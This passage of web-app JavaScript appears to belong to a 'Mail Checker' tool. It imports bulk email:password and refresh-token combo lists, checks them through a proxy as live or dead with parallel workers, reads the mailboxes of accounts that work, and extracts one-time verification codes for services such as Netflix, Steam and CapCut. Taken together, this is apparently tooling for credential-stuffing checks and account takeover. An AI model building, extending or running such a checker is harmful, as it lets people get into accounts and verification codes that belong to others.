        }

        const key = (email || token.slice(0, 40)).toLowerCase().trim();
        if (!seen.has(key)) {
          seen.add(key);
          results.push({
            email: email || 'Unknown Email',
            password: password,
            refresh_token: token,
            client_id: clientId
          });
        }
      }
      return results;
    }

    function parseCapcutLinesJS(rawText) {
      const lines = (rawText || '').split(String.fromCharCode(10)).map(l => l.trim());
      const accounts = [];
      const seen = new Set();

      for (let line of lines) {
        line = line.trim();
        if (!line || line.startsWith('#')) continue;

        let email = '', password = '';
        const emailMatch = line.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/);
        
        if (line.includes('----')) {
          const parts = line.split('----');
          email = parts[0].trim();
          password = parts[1] ? parts[1].trim() : '';
        } else if (line.includes(':')) {
          const parts = line.split(':');
          email = parts[0].trim();
          password = parts.slice(1).join(':').trim();
        } else if (line.includes('|')) {
          const parts = line.split('|');
          email = parts[0].trim();
          password = parts.slice(1).join('|').trim();
        } else if (line.includes('\t')) {
          const parts = line.split('\t');
          email = parts[0].trim();
          password = parts[1] ? parts[1].trim() : '';
        } else if (emailMatch) {
          email = emailMatch[0].trim();
          const rest = line.replace(email, '').trim().replace(/^[:|\s-]+/, '');
          password = rest;
        }

        if (email) {
          const key = (email + ':' + password).toLowerCase();
          if (!seen.has(key)) {
            seen.add(key);
            accounts.push({ email, password });
          }
        }
      }
      return accounts;
    }

    let outlookAccounts = [];
    let selectedAccountIndex = -1;
    let currentMailView = 'accounts';
    let currentInboxMessages = [];
    let currentPlatformFilter = 'all';

    const PLATFORM_KEYWORDS = {
      capcut: ['capcut', 'bytedance', 'tiktok'],
      netflix: ['netflix'],
      steam: ['steampowered', 'steam', 'valve'],
      epic: ['epicgames', 'epic games', 'epic'],
      tiktok: ['tiktok', 'bytedance'],
      telegram: ['telegram'],
      discord: ['discord'],
      microsoft: ['microsoft', 'xbox', 'live.com', 'outlook', 'security code']
    };

    function setMailView(view) {
      currentMailView = view;
      const el = document.getElementById('trackmailContainer');
      if (el) {
        el.classList.remove('tm-view-accounts', 'tm-view-inbox', 'tm-view-reader');
        el.classList.add('tm-view-' + view);
      }
    }

    function extractOtpCode(subject, preview, body) {
      const text = `${subject || ''} ${preview || ''} ${body || ''}`.replace(/<[^>]+>/g, ' ');
      // 1. Explicit OTP keywords
      const explicitMatch = text.match(/(?:code|kode|pin|otp|passcode|verification\s*code|kode\s*verifikasi|security\s*code)[:\s\-=]+([0-9]{4,8})/i);
      if (explicitMatch && explicitMatch[1]) return explicitMatch[1];

      // 2. Look for standalone 6 digit code
      const sixDigit = text.match(/\b([0-9]{6})\b/);
      if (sixDigit && sixDigit[1]) return sixDigit[1];

      // 3. Look for 4 to 8 digit code in subject
      const subjMatch = (subject || '').match(/\b([0-9]{4,8})\b/);
      if (subjMatch && subjMatch[1]) return subjMatch[1];

      return null;
    }

    function copyOtpDirect(otp, event) {
      if (event) event.stopPropagation();
      if (!otp) return;
      copyToClipboard(otp, '✓ ' + getI18nText('tm_copied', 'Disalin!') + ': ' + otp, 'fa-solid fa-key text-warning');
    }

    function saveOutlookAccountsStorage() {
      try {
        // Auto deduplicate before saving to localStorage
        const seen = new Set();
        const clean = [];
        for (const a of outlookAccounts) {
          if (!a) continue;
          const k = ((a.email && a.email !== 'Unknown Email' ? a.email : a.refresh_token) || '').toLowerCase().trim();
          if (k && !seen.has(k)) {
            seen.add(k);
            clean.push(a);
          }
        }
        outlookAccounts = clean;
        localStorage.setItem('chenstore_outlook_accounts', JSON.stringify(outlookAccounts));
      } catch(e) {}
    }

    function loadOutlookAccountsStorage() {
      try {
        const raw = localStorage.getItem('chenstore_outlook_accounts');
        if (raw) {
          const parsed = JSON.parse(raw) || [];
          const seen = new Set();
          const cleanList = [];
          for (const a of parsed) {
            if (!a || !a.ok) continue;
            const k = ((a.email && a.email !== 'Unknown Email' ? a.email : a.refresh_token) || '').toLowerCase().trim();
            if (k && !seen.has(k)) {
              seen.add(k);
              cleanList.push(a);
            }
          }
          outlookAccounts = cleanList;
          saveOutlookAccountsStorage();
          if (outlookAccounts.length > 0) {
            renderAccountsList();
            if (window.innerWidth > 991) {
              selectOutlookAccount(0);
            }
          } else {
            selectedAccountIndex = -1;
            renderAccountsList();
            const emailLbl = document.getElementById('tmActiveEmailLabel');
            if (emailLbl) emailLbl.textContent = getI18nText('tm_active_email_placeholder', 'Pilih Akun');
            const badge = document.getElementById('tmConnectionBadge');
            if (badge) {
              badge.className = 'badge bg-dark border border-secondary text-secondary px-2 py-1';
              badge.innerHTML = getI18nText('tm_badge_standby', '● Standby');
            }
            const inboxTitle = document.getElementById('tmInboxTitle');
            if (inboxTitle) inboxTitle.innerHTML = `<i class="fa-regular fa-folder-open me-1"></i> ${getI18nText('tm_inbox_title', 'INBOX')} (0)`;
            const msgCont = document.getElementById('tmMessagesContainer');
            if (msgCont) msgCont.innerHTML = `<div class="text-center text-muted py-5 small">${getI18nText('tm_empty_inbox_select', 'Pilih akun di sebelah kiri untuk melihat pesan inbox.')}</div>`;
            const reader = document.getElementById('tmReaderContent');
            if (reader) reader.innerHTML = `<div class="text-center text-muted my-auto"><i class="fa-regular fa-envelope-open fa-3x mb-3 text-warning"></i><h5 class="text-light">${getI18nText('tm_no_email_selected', 'Belum ada email yang dipilih')}</h5></div>`;
          }
        }
      } catch(e) {}
    }

    let showAllAccounts = false;

    function toggleShowAllAccounts() {
      showAllAccounts = !showAllAccounts;
      const btn = document.getElementById('btnToggleShowAll');
      const status = document.getElementById('tmAccountModeStatus');
      if (btn) {
        btn.innerHTML = showAllAccounts ? `<i class="fa-solid fa-filter me-1"></i>${getI18nText('tm_search_only', 'Mode Cari Saja')}` : `<i class="fa-solid fa-eye me-1"></i>${getI18nText('tm_show_all', 'Tampilkan Semua')}`;
      }
      if (status) {
        status.textContent = showAllAccounts ? getI18nText('tm_mode_all', 'Mode: Semua Akun') : getI18nText('tm_mode_search', 'Mode: Cari Email');
      }
      renderAccountsList();
    }

    function handleAccountSearchKeydown(event) {
      if (event.key === 'Enter') {
        const search = (document.getElementById('tmAccountSearch')?.value || '').toLowerCase().trim();
        if (!search) return;
        const matchedIdx = outlookAccounts.findIndex(acc => (acc.email || '').toLowerCase().includes(search));
        if (matchedIdx >= 0) {
          selectOutlookAccount(matchedIdx);
        }
      }
    }

    function renderAccountsList() {
      const container = document.getElementById('tmAccountsContainer');
      const search = (document.getElementById('tmAccountSearch')?.value || '').toLowerCase().trim();
      const countEl = document.getElementById('tmAccountCount');
      if (countEl) countEl.textContent = outlookAccounts.length;

      const btn = document.getElementById('btnToggleShowAll');
      const status = document.getElementById('tmAccountModeStatus');
      if (btn) {
        btn.innerHTML = showAllAccounts ? `<i class="fa-solid fa-filter me-1"></i>${getI18nText('tm_search_only', 'Mode Cari Saja')}` : `<i class="fa-solid fa-eye me-1"></i>${getI18nText('tm_show_all', 'Tampilkan Semua')}`;
      }
      if (status) {
        status.textContent = showAllAccounts ? getI18nText('tm_mode_all', 'Mode: Semua Akun') : getI18nText('tm_mode_search', 'Mode: Cari Email');
      }

      if (outlookAccounts.length === 0) {
        container.innerHTML = `<div class="text-center text-muted py-5 small">${getI18nText('tm_empty_acc_msg', 'Belum ada akun.<br>Upload file <b>.TXT</b> atau klik <b>Add</b>.')}</div>`;
        return;
      }

      // If search is empty and showAllAccounts is false -> Show active account + search prompt
      if (!search && !showAllAccounts) {
        let activeAccHtml = '';
        if (selectedAccountIndex >= 0 && outlookAccounts[selectedAccountIndex]) {
          const activeAcc = outlookAccounts[selectedAccountIndex];
          const initial = (activeAcc.email || 'U')[0].toUpperCase();
          const dotClass = activeAcc.ok ? 'live' : 'dead';
          activeAccHtml = `
            <div class="mb-3">
              <div class="small text-warning fw-bold mb-1" style="font-size: 0.7rem; letter-spacing: 0.5px;">
                <i class="fa-solid fa-circle-check me-1 text-success"></i> ACTIVE ACCOUNT:
              </div>
              <div class="tm-account-item active" style="margin-bottom: 0;">
                <div class="tm-avatar">${initial}</div>
                <div class="flex-grow-1 overflow-hidden">
                  <div class="d-flex align-items-center gap-2">
                    <span class="status-dot ${dotClass}"></span>
                    <span class="small fw-semibold text-truncate text-light">${escapeHtml(activeAcc.email)}</span>
                  </div>
                  <small class="text-muted d-block text-truncate" style="font-size: 0.72rem;">${activeAcc.ok ? (escapeHtml(activeAcc.latest_subject) || 'Connected') : (escapeHtml(activeAcc.error) || 'Dead')}</small>
                </div>
                <button class="btn btn-sm btn-link text-danger p-1 opacity-75 hover-opacity-100 flex-shrink-0" title="Delete account" onclick="deleteOutlookAccount(${selectedAccountIndex}, event)" style="font-size: 0.9rem;">
                    <i class="fa-solid fa-trash-can text-danger"></i>
                  </button>
                </div>
            </div>
          `;
        }

        container.innerHTML = `
          ${activeAccHtml}
          <div class="text-center text-muted py-4 px-2 small">
            <i class="fa-solid fa-magnifying-glass fa-2x mb-2 text-warning opacity-75"></i>
            <div class="text-light fw-semibold mb-1">${getI18nText('tm_search_another_title', 'Cari Akun Lain')}</div>
            <div class="text-secondary mb-3" style="font-size: 0.74rem;">
              ${getI18nText('tm_search_another_desc', 'Ketik email di kolom pencarian di atas untuk memilih akun.')}<br>
              <span class="badge bg-dark border border-warning text-warning mt-1">${outlookAccounts.length} ${getI18nText('tm_accounts_avail', 'Akun Tersedia')}</span>
            </div>
            <button class="btn btn-sm btn-outline-gold px-3 py-1" style="font-size: 0.75rem;" onclick="toggleShowAllAccounts()">
              <i class="fa-solid fa-eye me-1"></i> ${getI18nText('tm_show_all', 'Tampilkan Semua')} (${outlookAccounts.length})
            </button>
          </div>
        `;
        return;
      }

      let filtered = outlookAccounts.map((acc, idx) => ({ ...acc, originalIdx: idx }));
      if (search) {
        filtered = filtered.filter(acc => (acc.email || '').toLowerCase().includes(search));
      }

      if (filtered.length === 0) {
        container.innerHTML = `
          <div class="text-center text-muted py-4 small">
            ${getI18nText('tm_no_acc_match', 'Tidak ada akun yang cocok dengan')} "<b>${escapeHtml(search)}</b>"<br>
            <button class="btn btn-sm btn-link text-warning mt-2 small" onclick="toggleShowAllAccounts()">${getI18nText('tm_show_all', 'Tampilkan semua akun')}</button>
          </div>
        `;
        return;
      }

      let html = '';
      filtered.forEach(acc => {
        const idx = acc.originalIdx;
        const initial = (acc.email || 'U')[0].toUpperCase();
        const dotClass = acc.ok ? 'live' : 'dead';
        const activeClass = idx === selectedAccountIndex ? 'active' : '';

        html += `
          <div class="tm-account-item ${activeClass}" onclick="selectOutlookAccount(${idx})">
            <div class="tm-avatar">${initial}</div>
            <div class="flex-grow-1 overflow-hidden">
              <div class="d-flex align-items-center gap-2">
                <span class="status-dot ${dotClass}"></span>
                <span class="small fw-semibold text-truncate text-light">${escapeHtml(acc.email)}</span>
              </div>
              <small class="text-muted d-block text-truncate" style="font-size: 0.72rem;">${acc.ok ? (escapeHtml(acc.latest_subject) || 'Live') : (escapeHtml(acc.error) || 'Dead')}</small>
            </div>
            <button class="btn btn-sm btn-link text-danger p-1 opacity-75 hover-opacity-100 flex-shrink-0" title="Delete account" onclick="deleteOutlookAccount(${idx}, event)" style="font-size: 0.9rem;">
              <i class="fa-solid fa-trash-can text-danger"></i>
            </button>
          </div>
        `;
      });
      container.innerHTML = html;
    }

    function handleFileSelect(event) {
      const file = event.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = async function(e) {
        const text = e.target.result;
        if (!text) return showToast('File is empty!', 'fa-solid fa-triangle-exclamation text-warning');
        await importAccountsFromText(text);
        event.target.value = '';
      };
      reader.readAsText(file);
    }

    function handleTxtFileUpload(event) {
      return handleFileSelect(event);
    }

    function handleModalFileSelect(event) {
      const file = event.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = function(e) {
        const text = e.target.result;
        const inputEl = document.getElementById('modalAccountInput');
        if (inputEl) inputEl.value = text;
      };
      reader.readAsText(file);
    }

    async function importAccountsFromText(text, proxy = '') {
      const container = document.getElementById('tmAccountsContainer');
      container.innerHTML = `<div class="text-center text-muted py-5 small"><i class="fa-solid fa-spinner fa-spin me-2 text-warning"></i>${getI18nText('tm_extracting', 'Mengekstrak & memeriksa akun...')}</div>`;

      try {
        let items = parseOutlookLinesJS(text);
        if (!items || items.length === 0) {
          try {
            items = await safeFetchJson('/api/parse_accounts', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ text: text, mode: 'outlook' })
            });
          } catch(e) {}
        }

        if (!items || items.length === 0) {
          renderAccountsList();
          return showToast('Format tidak dikenali / token tidak ditemukan!', 'fa-solid fa-circle-xmark text-danger');
        }

        // Filter out items that are strictly duplicated in the input itself
        const uniqueItems = [];
        const seenInput = new Set();
        for (const it of items) {
          const k = ((it.email && it.email !== 'Unknown Email' ? it.email : it.refresh_token) || '').toLowerCase().trim();
          if (k && !seenInput.has(k)) {
            seenInput.add(k);
            uniqueItems.push(it);
          }
        }
        items = uniqueItems;

        let currentIndex = 0;
        let addedCount = 0;
        let updatedCount = 0;
        let deadCount = 0;
        let processedCount = 0;

        function updateImportStatus() {
          const percent = Math.round((processedCount / items.length) * 100);
          container.innerHTML = `<div class="text-center text-muted py-5 small">
            <i class="fa-solid fa-spinner fa-spin fa-2x mb-3 text-warning"></i>
            <div class="fw-bold text-light mb-1">Memeriksa Akun: ${processedCount} / ${items.length} (${percent}%)</div>
            <div class="small text-secondary mb-2"><span class="text-success"><i class="fa-solid fa-circle-check me-1"></i>${addedCount + updatedCount} Live</span> &bull; <span class="text-danger"><i class="fa-solid fa-circle-xmark me-1"></i>${deadCount} Dead</span></div>
            <div class="progress bg-dark border border-secondary mx-auto" style="height: 6px; max-width: 200px;">
              <div class="progress-bar bg-warning progress-bar-striped progress-bar-animated" style="width: ${percent}%;"></div>
            </div>
          </div>`;
        }

        async function worker() {
          while (currentIndex < items.length) {
            const idx = currentIndex++;
            const item = items[idx];
            try {
              const data = await safeFetchJson('/api/check_single_outlook', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  email: item.email,
                  password: item.password,
                  refresh_token: item.refresh_token,
                  client_id: item.client_id,
                  proxy: proxy
                })
              });
              processedCount++;
              if (data && data.ok && data.status === 'LIVE') {
                const accEmail = (data.email || item.email || '').toLowerCase().trim();
                const accToken = data.refresh_token || item.refresh_token || '';
                const existingIndex = outlookAccounts.findIndex(a => {
                  const e = (a.email || '').toLowerCase().trim();
                  return (e && e === accEmail) || (a.refresh_token && a.refresh_token === accToken);
                });

                if (existingIndex >= 0) {
                  outlookAccounts[existingIndex] = { ...outlookAccounts[existingIndex], ...data };
                  updatedCount++;
                } else {
                  outlookAccounts.push(data);
                  addedCount++;
                }
                saveOutlookAccountsStorage();
                if (selectedAccountIndex === -1 && window.innerWidth > 991) {
                  selectOutlookAccount(0);
                }
              } else {
                deadCount++;
              }
            } catch (e) {
              processedCount++;
              deadCount++;
            }
            updateImportStatus();
          }
        }

        const pool = [];
        for (let i = 0; i < Math.min(10, items.length); i++) {
          pool.push(worker());
        }
        await Promise.all(pool);
        saveOutlookAccountsStorage();
        renderAccountsList();

        if (deadCount > 0 && (addedCount + updatedCount) === 0) {
          showToast(`Email / Token Invalid atau Kedaluwarsa (${deadCount} akun invalid diabaikan)`, 'fa-solid fa-triangle-exclamation text-danger');
        } else if (deadCount > 0) {
          showToast(`Berhasil memuat ${addedCount + updatedCount} akun (${addedCount} baru, ${updatedCount} diperbarui, ${deadCount} invalid)`, 'fa-solid fa-circle-check text-warning');
        } else if (addedCount > 0 || updatedCount > 0) {
          showToast(`Berhasil menambahkan ${addedCount} akun baru (${updatedCount} diperbarui)`, 'fa-solid fa-circle-check text-success');
        }

      } catch (err) {
        showToast('Gagal memproses file: ' + err.message, 'fa-solid fa-circle-xmark text-danger');
        renderAccountsList();
      }
    }

    function deleteOutlookAccount(idx, event) {
      if (event) event.stopPropagation();
      const acc = outlookAccounts[idx];
      const emailName = acc ? acc.email : 'this account';
      const promptText = getI18nText('tm_delete_acc_confirm', 'Hapus {email} dari daftar?').replace('{email}', emailName);
      if (confirm(promptText)) {
        outlookAccounts.splice(idx, 1);
        saveOutlookAccountsStorage();
        if (selectedAccountIndex === idx) {
          selectedAccountIndex = outlookAccounts.length > 0 ? 0 : -1;
        } else if (selectedAccountIndex > idx) {
          selectedAccountIndex--;
        }
        renderAccountsList();
        if (selectedAccountIndex >= 0) {
          selectOutlookAccount(selectedAccountIndex);
        } else {
          setMailView('accounts');
          document.getElementById('tmActiveEmailLabel').textContent = getI18nText('tm_active_email_placeholder', 'Pilih Akun');
          document.getElementById('tmConnectionBadge').className = 'badge bg-dark border border-secondary text-secondary px-2 py-1';
          document.getElementById('tmConnectionBadge').innerHTML = getI18nText('tm_badge_standby', '● Standby');
          document.getElementById('tmInboxTitle').innerHTML = `<i class="fa-regular fa-folder-open me-1"></i> ${getI18nText('tm_inbox_title', 'INBOX')} (0)`;
          document.getElementById('tmMessagesContainer').innerHTML = `<div class="text-center text-muted py-5 small">${getI18nText('tm_empty_inbox_select', 'Pilih akun di sebelah kiri untuk melihat pesan inbox.')}</div>`;
          document.getElementById('tmReaderContent').innerHTML = `<div class="text-center text-muted my-auto"><i class="fa-regular fa-envelope-open fa-3x mb-3 text-warning"></i><h5 class="text-light">${getI18nText('tm_no_email_selected', 'Belum ada email yang dipilih')}</h5></div>`;
        }
      }
    }

    let deviceAuthTimer = null;
    let currentDeviceCode = '';
    let currentDeviceResultLine = '';

    async function openDeviceAuthModal() {
      stopDeviceAuthPolling();
      const modalEl = document.getElementById('deviceAuthModal');
      if (!modalEl) return;
      
      document.getElementById('deviceAuthStepLoading').style.display = 'block';
      document.getElementById('deviceAuthStepCode').style.display = 'none';
      document.getElementById('deviceAuthStepSuccess').style.display = 'none';

      let modalInst = bootstrap.Modal.getInstance(modalEl);
      if (!modalInst) modalInst = new bootstrap.Modal(modalEl);
      modalInst.show();

      try {
        const res = await fetch('/api/oauth/device/start', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753' })
        });
        const json = await res.json();
        if (!json.ok || !json.data) {
          throw new Error(json.error || 'Gagal menghubungi server otorisasi Microsoft');
        }

        const data = json.data;
        currentDeviceCode = data.device_code;
        document.getElementById('deviceAuthUserCode').textContent = data.user_code;
        
        const loginUrl = data.verification_uri || 'https://microsoft.com/devicelogin';
        const btnLink = document.getElementById('deviceAuthLoginLink');
        if (btnLink) btnLink.href = loginUrl;

        document.getElementById('deviceAuthStepLoading').style.display = 'none';
        document.getElementById('deviceAuthStepCode').style.display = 'block';

        const intervalMs = Math.max(3000, (data.interval || 5) * 1000);
        deviceAuthTimer = setInterval(pollDeviceToken, intervalMs);

      } catch (err) {
        document.getElementById('deviceAuthStepLoading').innerHTML = `
          <i class="fa-solid fa-triangle-exclamation text-danger fa-2x mb-2"></i>
          <p class="text-danger small mb-0">${err.message}</p>
        `;
      }
    }

    function stopDeviceAuthPolling() {
      if (deviceAuthTimer) {
        clearInterval(deviceAuthTimer);
        deviceAuthTimer = null;
      }
      currentDeviceCode = '';
    }

    async function pollDeviceToken() {
      if (!currentDeviceCode) return;
      try {
        const res = await fetch('/api/oauth/device/poll', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
            device_code: currentDeviceCode
          })
        });
        const json = await res.json();
        if (json.status === 'pending') {
          return; // Masih menunggu approval user
        }

        stopDeviceAuthPolling();

        if (json.ok && json.status === 'success') {
          currentDeviceResultLine = json.combo_line;
          document.getElementById('deviceAuthStepCode').style.display = 'none';
          document.getElementById('deviceAuthStepSuccess').style.display = 'block';
          document.getElementById('deviceAuthSuccessEmail').textContent = `Email Akun: ${json.email}`;
          document.getElementById('deviceAuthResultLine').value = json.combo_line;
          showToast('✅ Token Microsoft resmi berhasil didapatkan!', 'fa-solid fa-circle-check text-success');
        } else {
          showToast(json.error || 'Otorisasi gagal atau ditolak', 'fa-solid fa-circle-xmark text-danger');
          const stEl = document.getElementById('deviceAuthStatusText');
          if (stEl) stEl.textContent = json.error || 'Otorisasi gagal';
        }
      } catch (err) {
        console.error('Poll error:', err);
      }
    }

    function copyDeviceUserCode() {
      const code = document.getElementById('deviceAuthUserCode')?.textContent?.trim();
      if (!code) return;
      copyToClipboard(code, '✓ Kode Otorisasi Disalin!', 'fa-solid fa-copy text-warning');
    }

    function copyDeviceResultLine() {
      if (!currentDeviceResultLine) return;
      copyToClipboard(currentDeviceResultLine, '✓ Token Format Mail Reader Disalin!', 'fa-solid fa-key text-warning');
    }

    async function applyDeviceTokenToMailReader() {
      if (!currentDeviceResultLine) return;
      const modalEl = document.getElementById('deviceAuthModal');
      if (modalEl && window.bootstrap && bootstrap.Modal) {
        const inst = bootstrap.Modal.getInstance(modalEl);
        if (inst) inst.hide();
      }
      switchMainTab('mail');
      await importAccountsFromText(currentDeviceResultLine);
    }

    async function submitNewOutlookAccounts() {
      const inputEl = document.getElementById('modalAccountInput');
      const fileEl = document.getElementById('modalFileInput');
      const proxyEl = document.getElementById('modalProxyInput');
      const text = inputEl ? inputEl.value.trim() : '';
      const proxy = proxyEl ? proxyEl.value.trim() : '';
      if (!text) return showToast('Silakan masukkan token / akun atau upload file .txt!', 'fa-solid fa-triangle-exclamation text-warning');

      // Clear input fields immediately for next use
      if (inputEl) inputEl.value = '';
      if (fileEl) fileEl.value = '';
      if (proxyEl) proxyEl.value = '';

      // Force close modal
      try {
        const modalEl = document.getElementById('addAccountModal');
        if (modalEl) {
          const closeBtn = modalEl.querySelector('[data-bs-dismiss="modal"]');
          if (closeBtn) closeBtn.click();
          if (window.bootstrap && bootstrap.Modal) {
            const inst = bootstrap.Modal.getInstance(modalEl);
            if (inst) inst.hide();
          }
          modalEl.classList.remove('show');
          modalEl.style.display = 'none';
          document.querySelectorAll('.modal-backdrop').forEach(b => b.remove());
          document.body.classList.remove('modal-open');
          document.body.style.removeProperty('padding-right');
          document.body.style.removeProperty('overflow');
        }
      } catch(e) {}

      await importAccountsFromText(text, proxy);
    }

    function clearAllOutlookAccounts() {
      if (confirm(getI18nText('tm_clear_all_confirm', 'Hapus semua daftar akun Mail Checker?'))) {
        outlookAccounts = [];
        selectedAccountIndex = -1;
        currentInboxMessages = [];
        try { localStorage.removeItem('chenstore_outlook_accounts'); } catch(e) {}
        renderAccountsList();
        setMailView('accounts');
        document.getElementById('tmInboxTitle').innerHTML = `<i class="fa-regular fa-folder-open me-1"></i> ${getI18nText('tm_inbox_title', 'INBOX')} (0)`;
        document.getElementById('tmMessagesContainer').innerHTML = `<div class="text-center text-muted py-5 small">${getI18nText('tm_empty_inbox_select', 'Pilih akun di sebelah kiri untuk melihat pesan inbox.')}</div>`;
        document.getElementById('tmReaderContent').innerHTML = `<div class="text-center text-muted my-auto"><i class="fa-regular fa-envelope-open fa-3x mb-3 text-warning"></i><h5 class="text-light">${getI18nText('tm_no_email_selected', 'Belum ada email yang dipilih')}</h5></div>`;
      }
    }

    async function selectOutlookAccount(idx) {
      selectedAccountIndex = idx;
      renderAccountsList();
      if (window.innerWidth <= 991) {
        setMailView('inbox');
      }
      const acc = outlookAccounts[idx];
      if (!acc) return;
      document.getElementById('tmActiveEmailLabel').textContent = acc.email;

      const badge = document.getElementById('tmConnectionBadge');
      if (acc.ok) {
        badge.className = 'badge bg-success text-light px-2 py-1';
        badge.innerHTML = getI18nText('tm_badge_connected', '● Connected');
        await loadInboxMessages(acc);
      } else {
        badge.className = 'badge bg-danger text-light px-2 py-1';
        badge.innerHTML = getI18nText('tm_badge_disconnected', '● Disconnected');
        let errDesc = 'Email / Token Invalid atau Kedaluwarsa';
        document.getElementById('tmMessagesContainer').innerHTML = `<div class="text-center py-5 small text-danger"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
        document.getElementById('tmReaderContent').innerHTML = `
          <div class="text-center text-muted my-auto">
            <i class="fa-solid fa-triangle-exclamation fa-3x mb-3 text-danger"></i>
            <h5 class="text-danger">Email / Token Invalid</h5>
            <p class="small text-secondary px-3">${errDesc}</p>
          </div>
        `;
        showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
      }
    }

    function setPlatformFilter(platform) {
      currentPlatformFilter = platform;
      document.querySelectorAll('.tm-chip-btn').forEach(btn => btn.classList.remove('active'));
      const activeBtn = document.getElementById('chip-plat-' + platform);
      if (activeBtn) activeBtn.classList.add('active');
      renderCurrentMessages();
    }

    function renderCurrentMessages() {
      const container = document.getElementById('tmMessagesContainer');
      const search = (document.getElementById('tmMessageSearch')?.value || '').toLowerCase().trim();

      if (!currentInboxMessages || currentInboxMessages.length === 0) {
        container.innerHTML = `<div class="text-center text-muted py-5 small">${getI18nText('tm_inbox_empty', 'Inbox kosong.')}</div>`;
        return;
      }

      let filtered = currentInboxMessages.filter(msg => {
        // Filter by platform keywords
        if (currentPlatformFilter !== 'all') {
          const keys = PLATFORM_KEYWORDS[currentPlatformFilter] || [currentPlatformFilter];
          const text = `${msg.sender_name} ${msg.sender_email} ${msg.subject} ${msg.preview}`.toLowerCase();
          const match = keys.some(k => text.includes(k));
          if (!match) return false;
        }

        // Filter by user search input
        if (search) {
          const hay = `${msg.sender_name} ${msg.sender_email} ${msg.subject} ${msg.preview}`.toLowerCase();
          if (!hay.includes(search)) return false;
        }

        return true;
      });

      document.getElementById('tmInboxTitle').innerHTML = `<i class="fa-regular fa-folder-open me-1"></i> ${getI18nText('tm_inbox_title', 'INBOX')} (${filtered.length}/${currentInboxMessages.length})`;

      if (filtered.length === 0) {
        container.innerHTML = `<div class="text-center text-muted py-5 small">${getI18nText('tm_no_msg_filter', 'Tidak ada pesan yang cocok dengan filter.')}</div>`;
        return;
      }

      let html = '';
      filtered.forEach(msg => {
        const otp = extractOtpCode(msg.subject, msg.preview, '');
        html += `
          <div class="tm-message-item" id="msg-${msg.id}" onclick="readMessage('${msg.id}')">
            <div class="d-flex justify-content-between align-items-center mb-1">
              <span class="fw-bold small text-truncate text-light">${escapeHtml(msg.sender_name)}</span>
              <small class="text-warning" style="font-size: 0.72rem;">${msg.time_display}</small>
            </div>
            <div class="fw-semibold text-truncate small text-light mb-1">
              ${!msg.is_read ? '<span class="tm-unread-dot"></span>' : ''}"${escapeHtml(msg.subject)}"
            </div>
            <div class="text-muted text-truncate" style="font-size: 0.75rem;">
              ${escapeHtml(msg.preview || 'No preview')}
            </div>
            ${otp ? `
              <div class="mt-1.5 d-flex align-items-center gap-1.5">
                <span class="badge bg-warning text-dark fw-bold font-monospace py-0.5 px-2" style="font-size: 0.72rem;"><i class="fa-solid fa-key me-1"></i>OTP: ${otp}</span>
                <button class="btn btn-xs btn-outline-warning py-0 px-1.5 fw-semibold" style="font-size: 0.7rem;" onclick="copyOtpDirect('${otp}', event)">${getI18nText('tm_btn_copy', 'Salin')}</button>
              </div>
            ` : ''}
          </div>
        `;
      });
      container.innerHTML = html;

      if (filtered.length > 0 && window.innerWidth > 991) {
        readMessage(filtered[0].id);
      }
    }

    async function loadInboxMessages(acc) {
      const container = document.getElementById('tmMessagesContainer');
      container.innerHTML = `<div class="text-center text-muted py-5 small"><i class="fa-solid fa-spinner fa-spin me-2 text-warning"></i>Memuat pesan inbox...</div>`;

      try {
        const data = await safeFetchJson('/api/mail/inbox', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ refresh_token: acc.refresh_token, client_id: acc.client_id })
        });

        if (!data.ok) {
          let errDesc = 'Email / Token Invalid atau Kedaluwarsa';
          container.innerHTML = `<div class="text-center text-danger py-5 small"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
          showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
          return;
        }

        currentInboxMessages = data.messages || [];
        renderCurrentMessages();

      } catch (err) {
        let errDesc = 'Email / Token Invalid atau Kedaluwarsa';
        container.innerHTML = `<div class="text-center text-danger py-5 small"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
        showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
      }
    }

    async function readMessage(msgId) {
      if (selectedAccountIndex < 0) return;
      const acc = outlookAccounts[selectedAccountIndex];

      if (window.innerWidth <= 991) {
        setMailView('reader');
      }

      document.querySelectorAll('.tm-message-item').forEach(el => el.classList.remove('active'));
      const activeEl = document.getElementById('msg-' + msgId);
      if (activeEl) activeEl.classList.add('active');

      const reader = document.getElementById('tmReaderContent');
      reader.innerHTML = `<div class="text-center text-muted my-auto"><i class="fa-solid fa-spinner fa-spin fa-2x mb-2 text-warning"></i><p class="small">Memuat isi surat...</p></div>`;

      try {
        const data = await safeFetchJson('/api/mail/message', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message_id: msgId, refresh_token: acc.refresh_token, client_id: acc.client_id })
        });

        if (!data.ok) {
          let errDesc = 'Email / Token Invalid atau Gagal Memuat Surat';
          reader.innerHTML = `<div class="text-center text-danger my-auto"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
          showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
          return;
        }

        const otp = extractOtpCode(data.subject, '', data.body);
        let otpHtml = '';
        if (otp) {
          otpHtml = `
            <div class="otp-highlight-card mb-3">
              <div>
                <div class="small text-warning fw-bold text-uppercase"><i class="fa-solid fa-key me-1"></i> ${getI18nText('tm_otp_detected', 'KODE VERIFIKASI / OTP TERDETEKSI')}</div>
                <div class="otp-code-text">${otp}</div>
